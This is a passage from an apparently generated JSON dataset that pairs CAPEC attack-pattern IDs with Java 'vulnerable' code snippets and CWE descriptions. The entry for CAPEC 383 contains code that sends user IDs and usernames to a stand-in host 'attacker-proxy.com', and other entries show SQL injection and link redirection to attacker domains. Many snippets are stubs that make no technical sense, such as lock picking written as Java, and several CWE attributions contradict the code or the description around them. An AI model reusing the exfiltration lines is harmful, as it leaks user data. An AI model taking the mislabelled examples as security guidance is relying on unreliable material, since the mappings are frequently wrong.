        "description": "This Java code snippet demonstrates the OS fingerprinting attack described in the CAPEC. It sends a UDP datagram to a closed port on a target system and analyzes the ICMP error message response to fingerprint the OS. The code is vulnerable to CWE-204 (Observable Response Discrepancy) as it relies on the ICMP response to reveal internal state information. Additionally, it is vulnerable to CWE-319 (Cleartext Transmission of Sensitive Information) as it transmits sensitive information (ICMP response) in cleartext. CWE-211 (Externally-Generated Error Message Containing Sensitive Information) is also applicable as the ICMP error message can contain sensitive system information. CWE-1192, CWE-1276, and CWE-204 are not directly applicable to this code snippet."
    },
    {
        "capec_id": "383",
        "code_snippet": "public class VirtualSaleEvent {\n    private String userId;\n    private String username;\n    \n    public VirtualSaleEvent(String userId, String username) {\n        this.userId = userId;\n        this.username = username;\n    }\n    \n    public void attendEvent() {\n        // Unprotected primary channel (CWE-419)\n        Socket socket = new Socket(\"attacker-proxy.com\", 8080);\n        \n        // Cleartext transmission of sensitive information (CWE-319)\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write((\"userId:\" + userId + \",username:\" + username + \"\\n\").getBytes());\n        \n        // Missing encryption of sensitive data (CWE-311)\n        String unencryptedData = \"userId=\" + userId + \"&username=\" + username;\n        URL url = new URL(\"http://attacker-proxy.com/collectData\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        OutputStream os = connection.getOutputStream();\n        os.write(unencryptedData.getBytes());\n        \n        // Client-side enforcement of server-side security (CWE-602)\n        // The client is responsible for validating the user's input, but it does not\n        String userInput = readUserInput();\n        if (userInput != null) {\n            // Exposure of sensitive information through data queries (CWE-202)\n            // The attacker can infer information by analyzing the queries\n            String query = \"SELECT * FROM users WHERE username LIKE '\" + userInput + \"'%\";\n            executeQuery(query);\n        }\n    }\n    \n    private String readUserInput() {\n        // TO DO: implement user input reading\n        return null;\n    }\n    \n    private void executeQuery(String query) {\n        // TO DO: implement query execution\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable VirtualSaleEvent class that allows an attacker to harvest sensitive user data, such as user IDs and usernames, during an event. The code exhibits multiple vulnerabilities, including missing encryption of sensitive data, cleartext transmission of sensitive information, unprotected primary channel, client-side enforcement of server-side security, and exposure of sensitive information through data queries."
    },
    {
        "capec_id": "384",
        "code_snippet": "public class VulnerableApp {\n    public static void processRequest(String request) {\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // Trusting client-side validation\n        if (request.startsWith(\"https:\")) {\n            // CWE-311: Missing Encryption of Sensitive Data\n            // Storing sensitive data in plaintext\n            String sensitiveData = request.substring(8);\n            storeData(sensitiveData);\n        } else {\n            // CWE-345: Insufficient Verification of Data Authenticity\n            // Not verifying the origin of the request\n            processUnverifiedRequest(request);\n        }\n    }\n\n    public static void storeData(String data) {\n        // CWE-471: Modification of Assumed-Immutable Data (MAID)\n        // Modifying assumed-immutable data\n        DataStorage storage = DataStorage.getInstance();\n        storage.addData(data);\n    }\n\n    public static void processUnverifiedRequest(String request) {\n        // CWE-346: Origin Validation Error\n        // Not verifying the source of the request\n        RequestProcessor processor = new RequestProcessor();\n        processor.process(request);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that trusts client-side validation, stores sensitive data in plaintext, and fails to verify the origin and authenticity of requests. An attacker can manipulate the request data to gain unauthorized privileges or conduct phishing attacks."
    },
    {
        "capec_id": "385",
        "code_snippet": "public class InsecureGameExchange {\n    public static void exchangeItems(String itemId, String userId) {\n        // CWE-311: Missing Encryption of Sensitive Data\n        String unencryptedData = \"itemId=\" + itemId + \"&userId=\" + userId;\n        Socket socket = new Socket(\"gameServer.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(unencryptedData.getBytes());\n\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // Trusting the client to send valid data\n        InputStream inputStream = socket.getInputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead = inputStream.read(buffer);\n        String response = new String(buffer, 0, bytesRead);\n\n        // CWE-345: Insufficient Verification of Data Authenticity\n        // Not verifying the authenticity of the response\n        if (response.contains(\"success\")) {\n            System.out.println(\"Item exchanged successfully!\");\n        }\n\n        // CWE-346: Origin Validation Error\n        // Not verifying the origin of the response\n        String newItemId = response.split(\"=\")[1];\n        System.out.println(\"New item ID: \" + newItemId);\n\n        // CWE-471: Modification of Assumed-Immutable Data (MAID)\n        // Modifying the assumed-immutable item ID\n        String modifiedItemId = newItemId + \"_hacked\";\n        System.out.println(\"Modified item ID: \" + modifiedItemId);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable game exchange system that allows an attacker to manipulate the content of messages or items being exchanged. The code lacks encryption of sensitive data, trusts the client to send valid data, fails to verify the authenticity and origin of the response, and allows modification of assumed-immutable data."
    },
    {
        "capec_id": "386",
        "code_snippet": "public class NavigationRemapping { \npublic static void sendMessage(User user, String message) { \nString userProfileLink = user.getProfileLink(); \nString manipulatedLink = \"http://attacker-controlled-destination.com\"; \nif (userProfileLink != null) { \nString modifiedMessage = message.replace(userProfileLink, manipulatedLink); \n// Send the modified message to the user \nsendMessageToUser(modifiedMessage); \n} \n} \n\npublic static void sendMessageToUser(String message) { \n// Assume this method sends the message to the user \nSystem.out.println(\"Message sent: \" + message); \n} \n}",
        "description": "This Java code snippet demonstrates the CAPEC of navigation remapping. It allows an attacker to manipulate the profile link of a user and replace it with a malicious link. The CWEs embodied in this code snippet are CWE-471 (Modification of Assumed-Immutable Data), CWE-345 (Insufficient Verification of Data Authenticity), CWE-346 (Origin Validation Error), CWE-602 (Client-Side Enforcement of Server-Side Security), and CWE-311 (Missing Encryption of Sensitive Data). The code does not properly verify the origin or authenticity of the user's profile link, and it does not encrypt sensitive data before transmission. This allows an attacker to manipulate the link and redirect the user to a malicious destination."
    },
    {
        "capec_id": "387",
        "code_snippet": "public class InsecureDataTransfer {\n    public static void sendData(String data) {\n        // CWE-311: Missing Encryption of Sensitive Data\n        String unencryptedData = \"unencrypted_\" + data;\n        Socket socket = new Socket(\"example.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(unencryptedData.getBytes());\n\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // Trusting the client to send valid data\n        String receivedData = receiveData(socket);\n        processReceivedData(receivedData);\n    }\n\n    public static String receiveData(Socket socket) {\n        // CWE-345: Insufficient Verification of Data Authenticity\n        // No verification of data origin or authenticity\n        InputStream inputStream = socket.getInputStream();\n        byte[] buffer = new byte[1024];\n        inputStream.read(buffer);\n        return new String(buffer);\n    }\n\n    public static void processReceivedData(String data) {\n        // CWE-471: Modification of Assumed-Immutable Data (MAID)\n        // Assuming data is immutable, but it can be modified\n        String assumedImmutableData = data;\n        // Perform operations on assumedImmutableData\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of manipulating egress or ingress data within an application framework. It includes CWE-311 by sending unencrypted sensitive data, CWE-602 by trusting the client to send valid data, CWE-345 by not verifying data origin or authenticity, CWE-471 by assuming data is immutable, and CWE-346 by not properly verifying the source of data."
    },
    {
        "capec_id": "388",
        "code_snippet": "public class VulnerableAPI {\\n\\tprivate String buttonDestination;\\n\\tprivate String buttonContent;\\n\\t\\n\\tpublic VulnerableAPI(String buttonDestination, String buttonContent) {\\n\\t\\tthis.buttonDestination = buttonDestination;\\n\\t\\tthis.buttonContent = buttonContent;\\n\\t}\\n\\t\\n\\tpublic String getButtonHTML() {\\n\\t\\treturn \"<button onclick=\\\"window.location.href='\" + buttonDestination + \"'\\\">\" + buttonContent + \"</button>\";\\n\\t}\\n\\t\\n\\tpublic void setButtonDestination(String buttonDestination) {\\n\\t\\tthis.buttonDestination = buttonDestination;\\n\\t}\\n\\t\\n\\tpublic void setButtonContent(String buttonContent) {\\n\\t\\tthis.buttonContent = buttonContent;\\n\\t}\\n}\\n\\npublic class Main {\\n\\tpublic static void main(String[] args) {\\n\\t\\tVulnerableAPI api = new VulnerableAPI(\"https://example.com\", \"Click me!\");\\n\\t\\t// Assume an attacker intercepts and modifies the buttonDestination and buttonContent\\n\\t\\tapi.setButtonDestination(\"https://attacker.com\");\\n\\t\\tapi.setButtonContent(\"Malicious button\");\\n\\t\\tSystem.out.println(api.getButtonHTML());\\n\\t}\\n}",
        "description": "This Java code snippet demonstrates the CAPEC where an attacker manipulates the egress data from a client within an application framework to change the destination and/or content of buttons displayed to a user within API messages. The CWEs embodied in this code snippet include CWE-471 (Modification of Assumed-Immutable Data), CWE-345 (Insufficient Verification of Data Authenticity), CWE-346 (Origin Validation Error), CWE-602 (Client-Side Enforcement of Server-Side Security), and CWE-311 (Missing Encryption of Sensitive Data). The code creates a VulnerableAPI class that generates HTML buttons based on user-input data without proper validation or encryption, allowing an attacker to modify the button destination and content."
    },
    {
        "capec_id": "389",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SpoofingAttack {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"https://example.com/api/data\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"Authorization\", \"Bearer \" + getSpoofedToken());\n        int responseCode = connection.getResponseCode();\n        if (responseCode == 200) {\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuffer response = new StringBuffer();\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n            System.out.println(response.toString());\n        }\n    }\n\n    public static String getSpoofedToken() {\n        // Spoofed token generated using a modified client\n        return \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaGFuIjoiMjMwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates a content-spoofing attack within an application API. The attacker manipulates the Authorization header by using a spoofed token, which is generated using a modified client. This allows the attacker to bypass authentication and access protected resources. The code does not implement any integrity checks, making it vulnerable to CWE-353. Additionally, it relies on client-side authentication, which can be bypassed using CWE-603. The use of a spoofed token also relates to CWE-290 and CWE-294."
    },
    {
        "capec_id": "390",
        "code_snippet": "public class PhysicalSecurityBreach {\n    private static final String SECRET_KEY = \"my_secret_key\";\n    private static final int MAX_VOLTAGE = 5;\n    private static final int MIN_VOLTAGE = 1;\n\n    public static void main(String[] args) {\n        // CWE-1300: Improper Protection of Physical Side Channels\n        // Using a simple power consumption pattern to leak secret key\n        for (int i = 0; i < SECRET_KEY.length(); i++) {\n            if (SECRET_KEY.charAt(i) == '1') {\n                // High power consumption\n                System.out.print(\"High \");\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException e) {\n                    // Ignore\n                }\n            } else {\n                // Low power consumption\n                System.out.print(\"Low \");\n                try {\n                    Thread.sleep(50);\n                } catch (InterruptedException e) {\n                    // Ignore\n                }\n            }\n        }\n\n        // CWE-1263: Improper Physical Access Control\n        // Granting access to restricted areas without proper authentication\n        if (args.length > 0 && args[0].equals(\"admin\")) {\n            System.out.println(\"Access granted to restricted area.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n\n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        // Failing to detect and mitigate voltage glitches\n        int voltage = getVoltageFromSensor();\n        if (voltage > MAX_VOLTAGE || voltage < MIN_VOLTAGE) {\n            System.out.println(\"Voltage glitch detected, but ignored.\");\n        }\n\n        // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n        // Failing to detect and mitigate EM-FI attacks\n        if (isEMFIAttackDetected()) {\n            System.out.println(\"EM-FI attack detected, but ignored.\");\n        }\n\n        // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n        // Disabling alerts about signal conditions exceeding limits\n        disableAlerts();\n        System.out.println(\"Alerts disabled.\");\n    }\n\n    private static int getVoltageFromSensor() {\n        // Simulating a voltage sensor\n        return (int) (Math.random() * 10);\n    }\n\n    private static boolean isEMFIAttackDetected() {\n        // Simulating EM-FI attack detection\n        return Math.random() < 0.5;\n    }\n\n    private static void disableAlerts() {\n        // Simulating alert disabling\n        System.out.println(\"Alerts disabled.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a physical security breach by exploiting various vulnerabilities. It uses a simple power consumption pattern to leak a secret key (CWE-1300), grants access to restricted areas without proper authentication (CWE-1263), fails to detect and mitigate voltage glitches (CWE-1247), ignores electromagnetic fault injection attacks (CWE-1319), and disables alerts about signal conditions exceeding limits (CWE-1320)."
    },
    {
        "capec_id": "391",
        "code_snippet": "public class PhysicalAccessController {\n    private boolean isLocked = true;\n    private boolean isAdminMode = false;\n    private boolean isDebugMode = false;\n\n    public void lockDevice() {\n        if (!isAdminMode && !isDebugMode) {\n            isLocked = true;\n        }\n    }\n\n    public void unlockDevice() {\n        if (isAdminMode || isDebugMode) {\n            isLocked = false;\n        }\n    }\n\n    public void setAdminMode(boolean isAdmin) {\n        isAdminMode = isAdmin;\n    }\n\n    public void setDebugMode(boolean isDebug) {\n        isDebugMode = isDebug;\n    }\n\n    public boolean isDeviceLocked() {\n        return isLocked;\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        PhysicalAccessController pac = new PhysicalAccessController();\n\n        // CWE-1263: Improper Physical Access Control\n        pac.setAdminMode(true);\n        pac.unlockDevice();\n\n        // CWE-1231: Improper Prevention of Lock Bit Modification\n        pac.setDebugMode(true);\n        pac.unlockDevice();\n\n        // CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n        // CWE-412: Unrestricted Externally Accessible Lock\n        // CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks\n        if (!pac.isDeviceLocked()) {\n            System.out.println(\"Device is unlocked.\");\n        } else {\n            System.out.println(\"Device is locked.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of bypassing physical security measures by exploiting vulnerabilities in physical access control. The PhysicalAccessController class has methods to lock and unlock a device, but the lock can be bypassed by setting admin mode or debug mode. The Main class demonstrates how an attacker can exploit these vulnerabilities to gain unauthorized access to the device."
    },
    {
        "capec_id": "392",
        "code_snippet": "public class LockBumpingAttack {\n    private static final int LOCK_BIT = 0x01;\n    private static final int KEY_PIN_COUNT = 5;\n    private static final int[] KEY_PINS = new int[KEY_PIN_COUNT];\n    private static final int[] DRIVER_PINS = new int[KEY_PIN_COUNT];\n\n    public static void main(String[] args) {\n        // Hard-coded cryptographic key (CWE-321)\n        byte[] hardcodedKey = {0x01, 0x02, 0x03, 0x04, 0x05};\n\n        // Insufficient granularity of address regions protected by register locks (CWE-1222)\n        int addressRegion = 0x1000;\n        int lockControlBit = 0x01;\n\n        // Improper prevention of lock bit modification (CWE-1231)\n        setLockBit(LOCK_BIT);\n\n        // Improper lock behavior after power state transition (CWE-1232)\n        powerStateTransition();\n\n        // Simulate lock bumping attack\n        for (int i = 0; i < KEY_PIN_COUNT; i++) {\n            KEY_PINS[i] = DRIVER_PINS[i];\n        }\n\n        // Use the bumped key to open the lock\n        openLock(KEY_PINS, hardcodedKey);\n    }\n\n    private static void setLockBit(int lockBit) {\n        // Set the lock bit, but do not prevent its modification\n        // CWE-1231\n    }\n\n    private static void powerStateTransition() {\n        // After power state transition, some protected registers or lock bits become programmable\n        // CWE-1232\n    }\n\n    private static void openLock(int[] keyPins, byte[] hardcodedKey) {\n        // Use the bumped key and hardcoded cryptographic key to open the lock\n        // CWE-321\n    }\n}",
        "description": "This Java code snippet demonstrates a lock bumping attack, which is a type of physical attack on locks. The code includes several CWEs, such as hard-coded cryptographic key, insufficient granularity of address regions protected by register locks, improper prevention of lock bit modification, and improper lock behavior after power state transition. The code simulates a lock bumping attack by using a bumped key to open a lock, which is secured by a set of internal pins and spring-loaded driver pins. The code does not prevent the lock bit from being modified and allows the system configuration to be changed after power state transitions."
    },
    {
        "capec_id": "393",
        "code_snippet": "public class LockPickingAttack {\n    private static final Object lock = new Object();\n    private static boolean isLocked = true;\n    private static int addressRegion = 0x1000;\n    private static int lockBit = 0x01;\n\n    public static void main(String[] args) {\n        // CWE-1231: Improper Prevention of Lock Bit Modification\n        setLockBit(lockBit);\n\n        // CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n        protectAddressRegion(addressRegion, lockBit);\n\n        // CWE-412: Unrestricted Externally Accessible Lock\n        if (isLocked) {\n            synchronized (lock) {\n                // CWE-832: Unlock of a Resource that is not Locked\n                unlockResource(lock);\n            }\n        }\n\n        // CWE-833: Deadlock\n        Thread thread1 = new Thread(new Runnable() {\n            public void run() {\n                synchronized (lock) {\n                    try {\n                        Thread.sleep(1000);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        });\n        Thread thread2 = new Thread(new Runnable() {\n            public void run() {\n                synchronized (lock) {\n                    try {\n                        Thread.sleep(1000);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        });\n        thread1.start();\n        thread2.start();\n    }\n\n    private static void setLockBit(int lockBit) {\n        // modify the lock bit\n        lockBit = 0x00;\n    }\n\n    private static void protectAddressRegion(int addressRegion, int lockBit) {\n        // protect a large address region with the same lock bit\n        // this can cause conflicts between functional and security requirements\n    }\n\n    private static void unlockResource(Object lock) {\n        // unlock a resource that is not locked\n        synchronized (lock) {\n            // do something\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a lock picking attack, which is a type of attack that bypasses the locks on a system or resource. The code includes several CWEs, including CWE-1231 (Improper Prevention of Lock Bit Modification), CWE-1222 (Insufficient Granularity of Address Regions Protected by Register Locks), CWE-412 (Unrestricted Externally Accessible Lock), CWE-832 (Unlock of a Resource that is not Locked), and CWE-833 (Deadlock). The code shows how an attacker can manipulate the lock bits and address regions to gain unauthorized access to a system or resource."
    },
    {
        "capec_id": "394",
        "code_snippet": "public class SnapGunLock { \n\\tprivate static final Object lock = new Object(); \n\\tprivate static boolean isLocked = true; \n\\tprivate static int keyPin = 0; \n\\tprivate static int driverPin = 0; \n\n\\tpublic static void lock() { \n\\t\\twhile (isLocked) { \n\\t\\t\\tsynchronized (lock) { \n\\t\\t\\t\\ttry { \n\\t\\t\\t\\t\\tlock.wait(); \n\\t\\t\\t\\t} catch (InterruptedException e) { \n\\t\\t\\t\\t\\tThread.currentThread().interrupt(); \n\\t\\t\\t\\t} \n\\t\\t\\t} \n\\t\\t} \n\\t} \n\n\\tpublic static void unlock() { \n\\t\\tif (keyPin == driverPin) { \n\\t\\t\\tisLocked = false; \n\\t\\t\\tlock.notifyAll(); \n\\t\\t} else { \n\\t\\t\\t// CWE-833: Deadlock - The product contains multiple threads or executable segments that are waiting for each other to release a necessary lock, resulting in deadlock. \n\\t\\t\\t// CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks - The product defines a large address region protected from modification by the same register lock control bit. \n\\t\\t\\t// CWE-1231: Improper Prevention of Lock Bit Modification - The product uses a trusted lock bit for restricting access to registers, address regions, or other resources, but the product does not prevent the value of the lock bit from being modified after it has been set. \n\\t\\t\\t// CWE-1394: Use of Default Cryptographic Key - The product uses a default cryptographic key for potentially critical functionality. \n\\t\\t\\t// CWE-1232: Improper Lock Behavior After Power State Transition - Register lock bit protection disables changes to system configuration once the bit is set. Some of the protected registers or lock bits become programmable after power state transitions (e.g., Entry and wake from low power sleep modes) causing the system configuration to be changeable. \n\\t\\t\\t// Snap Gun exploit: Force the lock into momentary alignment by striking all key pins at once. \n\\t\\t\\tkeyPin = driverPin; \n\\t\\t\\tisLocked = false; \n\\t\\t\\tlock.notifyAll(); \n\\t\\t} \n\\t} \n}",
        "description": "This Java code snippet demonstrates a vulnerable lock mechanism that can be exploited using a Snap Gun technique, similar to lock bumping. The lock is initially set to a default state, and the keyPin and driverPin are not properly synchronized, leading to a deadlock. The unlock method can be forced into momentary alignment by striking all key pins at once, similar to a Snap Gun exploit. This code also includes CWEs related to improper lock behavior, insufficient granularity of address regions, and use of default cryptographic keys."
    },
    {
        "capec_id": "395",
        "code_snippet": "import java.security.Key;\nimport java.security.KeyFactory;\nimport java.security.spec.X509EncodedKeySpec;\nimport javax.crypto.Cipher;\n\npublic class AccessControlExploit {\n    private static final String HARD_CODED_KEY = \"my_secret_key\";\n    private static final String ALGORITHM = \"RSA\";\n\n    public static void main(String[] args) throws Exception {\n        // Hard-coded cryptographic key (CWE-321)\n        Key key = KeyFactory.getInstance(ALGORITHM).generatePublic(new X509EncodedKeySpec(HARD_CODED_KEY.getBytes()));\n\n        // Broken cryptographic algorithm (CWE-327)\n        Cipher cipher = Cipher.getInstance(\"RSA/ECB/NoPadding\");\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n\n        // Simulating RFID tag data\n        byte[] rfidData = \"access_granted\".getBytes();\n        byte[] encryptedData = cipher.doFinal(rfidData);\n\n        // Simulating electromagnetic fault injection attack (CWE-1319)\n        // to bypass access control\n        byte[] faultInjectedData = injectElectromagneticFault(encryptedData);\n\n        // Simulating reverse-engineered algorithm to generate new cards\n        byte[] newCardData = reverseEngineerAlgorithm(faultInjectedData);\n\n        // Using the new card data to gain access\n        System.out.println(\"Access granted with new card data: \" + new String(newCardData));\n    }\n\n    // Simulating electromagnetic fault injection attack\n    private static byte[] injectElectromagneticFault(byte[] data) {\n        // This is a simulated attack, in a real-world scenario, an attacker would use\n        // specialized equipment to inject faults into the device\n        return data;\n    }\n\n    // Simulating reverse-engineered algorithm to generate new cards\n    private static byte[] reverseEngineerAlgorithm(byte[] data) {\n        // This is a simulated attack, in a real-world scenario, an attacker would use\n        // techniques such as IC imaging (CWE-1278) to reverse-engineer the algorithm\n        return data;\n    }\n}\n",
        "description": "This Java code snippet demonstrates an exploit of an electronic access control system by using a hard-coded cryptographic key, a broken cryptographic algorithm, and simulating electromagnetic fault injection and reverse-engineering attacks to gain unauthorized access."
    },
    {
        "capec_id": "396",
        "code_snippet": "import java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport javax.crypto.Cipher;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) throws Exception {\n        KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"RSA\");\n        kpg.initialize(1024);\n        KeyPair kp = kpg.generateKeyPair();\n        PublicKey publicKey = kp.getPublic();\n        PrivateKey privateKey = kp.getPrivate();\n\n        // CWE-290: Authentication Bypass by Spoofing\n        String spoofedUsername = \"hacker\";\n        String spoofedPassword = \"password\";\n        String authenticationToken = encrypt(spoofedUsername + \":\" + spoofedPassword, privateKey);\n        System.out.println(\"Spoofed authentication token: \" + authenticationToken);\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        String capturedToken = \"captured_authentication_token\";\n        String replayedUsername = decrypt(capturedToken, publicKey);\n        System.out.println(\"Replayed username: \" + replayedUsername);\n\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        Cipher cipher = Cipher.getInstance(\"RSA/ECB/NoPadding\");\n        cipher.init(Cipher.ENCRYPT_MODE, publicKey);\n        byte[] encryptedData = cipher.doFinal(\"sensitive_data\".getBytes());\n        System.out.println(\"Encrypted data: \" + new String(encryptedData));\n    }\n\n    public static String encrypt(String data, PrivateKey privateKey) throws Exception {\n        Cipher cipher = Cipher.getInstance(\"RSA/ECB/NoPadding\");\n        cipher.init(Cipher.ENCRYPT_MODE, privateKey);\n        byte[] encryptedData = cipher.doFinal(data.getBytes());\n        return new String(encryptedData);\n    }\n\n    public static String decrypt(String data, PublicKey publicKey) throws Exception {\n        Cipher cipher = Cipher.getInstance(\"RSA/ECB/NoPadding\");\n        cipher.init(Cipher.DECRYPT_MODE, publicKey);\n        byte[] decryptedData = cipher.doFinal(data.getBytes());\n        return new String(decryptedData);\n    }\n}",
        "description": "This Java code snippet demonstrates authentication bypass vulnerabilities. It includes CWE-290: Authentication Bypass by Spoofing, CWE-294: Authentication Bypass by Capture-replay, and CWE-327: Use of a Broken or Risky Cryptographic Algorithm. The code generates a key pair, uses it for encryption and decryption, and showcases spoofing and capture-replay attacks. The cryptographic algorithm used is RSA with ECB mode and no padding, which is a broken and risky algorithm."
    },
    {
        "capec_id": "397",
        "code_snippet": "import java.io.Serializable;\nimport java.util.Base64;\nimport javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class MagstripeCard implements Serializable, Cloneable {\n    private String cardData;\n    private SecretKey secretKey;\n\n    public MagstripeCard(String cardData) {\n        this.cardData = cardData;\n        this.secretKey = generateKey();\n    }\n\n    private SecretKey generateKey() {\n        try {\n            KeyGenerator keyGen = KeyGenerator.getInstance(\"DES\");\n            keyGen.init(56);\n            return keyGen.generateKey();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public String getCardData() {\n        return cardData;\n    }\n\n    public void setCardData(String cardData) {\n        this.cardData = cardData;\n    }\n\n    public byte[] encryptCardData() {\n        try {\n            Cipher cipher = Cipher.getInstance(\"DES\");\n            cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n            return cipher.doFinal(cardData.getBytes());\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public Object clone() {\n        try {\n            return super.clone();\n        } catch (CloneNotSupportedException e) {\n            return null;\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of duplicating a magnetic strip card to gain unauthorized access. The MagstripeCard class contains sensitive information (cardData) and is cloneable, making it vulnerable to CWE-498. The class uses a broken cryptographic algorithm (DES) for encryption, which is vulnerable to CWE-327. The generateKey method does not properly protect against electromagnetic fault injection attacks, making it vulnerable to CWE-1319. The class also mirrors regions without ensuring their contents stay in sync, making it vulnerable to CWE-1251. Finally, the class does not protect mirrored regions in the on-chip fabric firewall, making it vulnerable to CWE-1312."
    },
    {
        "capec_id": "398",
        "code_snippet": "import java.security.Key;\nimport java.security.KeyFactory;\nimport java.security.spec.X509EncodedKeySpec;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class MagneticStripCardAnalyzer {\n    private static final String HARD_CODED_KEY = \"my_secret_key\";\n    private static final String BROKEN_CRYPTO_ALGORITHM = \"DES\";\n\n    public static void analyzeCards(String card1Data, String card2Data) {\n        // CWE-321: Use of Hard-coded Cryptographic Key\n        Key key = new SecretKeySpec(HARD_CODED_KEY.getBytes(), BROKEN_CRYPTO_ALGORITHM);\n\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        Cipher cipher = Cipher.getInstance(BROKEN_CRYPTO_ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n\n        // CWE-307: Improper Restriction of Excessive Authentication Attempts\n        for (int i = 0; i < 1000; i++) {\n            try {\n                // Attempt to authenticate with generated card data\n                authenticate(card1Data, card2Data);\n            } catch (Exception e) {\n                // Ignore authentication failures\n            }\n        }\n\n        // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n        // Assume this method is vulnerable to EM-FI attacks\n        generateNewCard(key, card1Data, card2Data);\n    }\n\n    private static void authenticate(String cardData1, String cardData2) throws Exception {\n        // CWE-290: Authentication Bypass by Spoofing\n        // Assume this method is vulnerable to spoofing attacks\n        // Perform authentication using card data\n    }\n\n    private static void generateNewCard(Key key, String cardData1, String cardData2) {\n        // Generate new card data using the analyzed data and hard-coded key\n        // This new card data can be used for unauthorized access and/or impersonation\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of analyzing magnetic strip card data to generate new cards with valid sequences for unauthorized access and/or impersonation. It incorporates multiple CWEs, including CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-1319 (Improper Protection against Electromagnetic Fault Injection), CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-321 (Use of Hard-coded Cryptographic Key), and CWE-290 (Authentication Bypass by Spoofing)."
    },
    {
        "capec_id": "399",
        "code_snippet": "public class RFIDCloner {\n    private String securityIdentifier;\n    private byte[] transactionSignal;\n\n    public RFIDCloner(String securityIdentifier, byte[] transactionSignal) {\n        this.securityIdentifier = securityIdentifier;\n        this.transactionSignal = transactionSignal;\n    }\n\n    public void cloneRFID() {\n        // CWE-1294: Insecure Security Identifier Mechanism\n        // Incorrect implementation of security identifier mechanism\n        if (securityIdentifier.equals(\"default\")) {\n            // Allow access without proper authentication\n            System.out.println(\"Access granted\");\n        }\n\n        // CWE-1290: Incorrect Decoding of Security Identifiers\n        // Incorrect decoding of bus-transaction signals\n        String decodedSignal = decodeTransactionSignal(transactionSignal);\n        if (decodedSignal.equals(\"allowed\")) {\n            // Grant access without proper authentication\n            System.out.println(\"Access granted\");\n        }\n\n        // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n        // Susceptible to electromagnetic fault injection attacks\n        try {\n            // Simulate electromagnetic fault injection attack\n            simulateEMFIAttack();\n        } catch (Exception e) {\n            // Ignore exception and grant access\n            System.out.println(\"Access granted\");\n        }\n\n        // CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n        // Behave differently than other RFID products\n        System.out.println(\"RFID Cloner: Access granted\");\n\n        // CWE-694: Use of Multiple Resources with Duplicate Identifier\n        // Use multiple resources with duplicate identifier\n        useMultipleResourcesWithDuplicateIdentifier();\n    }\n\n    private String decodeTransactionSignal(byte[] transactionSignal) {\n        // Incorrect decoding implementation\n        return \"allowed\";\n    }\n\n    private void simulateEMFIAttack() throws Exception {\n        // Simulate electromagnetic fault injection attack\n        throw new Exception(\"EMFI attack simulated\");\n    }\n\n    private void useMultipleResourcesWithDuplicateIdentifier() {\n        // Use multiple resources with duplicate identifier\n        System.out.println(\"Using multiple resources with duplicate identifier\");\n    }\n}",
